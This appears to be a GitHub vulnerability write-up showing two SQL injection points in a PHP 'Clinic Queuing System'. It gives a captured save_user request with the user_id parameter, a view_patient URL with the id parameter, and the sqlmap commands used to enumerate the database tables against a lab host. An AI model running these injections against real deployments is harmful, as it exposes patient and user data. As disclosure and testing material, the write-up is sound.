# Clinic-Queuing-System
Clinic Queuing System Vulnerability exploitation
# Injection point 1
Function points：Users->Add New
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/1.png)
Enter all information to save and capture the package using burpsuite
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/2.png)
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/3.png)
data packet
```
POST /php-sqlite-cqs/LoginRegistration.php?a=save_user HTTP/1.1
Host: 192.168.17.1
Content-Length: 143
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.17.1
Referer: http://192.168.17.1/php-sqlite-cqs/?page=manage_user
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a5r847gtg31fcaj6bs2hk6991v
Connection: close

formToken=%242y%2410%24yN7Wr9kopiTJpbrSGGgaF.2Ufy.K9X2Sw1jaHwM1Z3HWM%2Fb.LYgwm&user_id=&fullname=yy&username=yy&password=123456&type=1&status=0
```

Sqlmap command
```python
py .\sqlmap.py -r .\1.txt -p user_id –tables
```

User_id parameter has SQL injection and was successfully injected into tables
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/4.png)

# Injection point 2
Click +Add Record, fill in the information, and save
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/5.png)
Function points：Patient List->view patient
Open the burpsuite tool to capture packets before clicking on view patient
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/6.png)
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/7.png)
Put the captured data packets into the sqlmap tool

Vulnerability URL
```
http://192.168.17.1/php-sqlite-cqs/?page=view_patient&id=23
```
Sqlmap command
```python
py .\sqlmap.py -r .\1.txt -p id --tables –batch
```
id is an SQL injection parameter, successfully injected into Tebles
 ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/8.png)
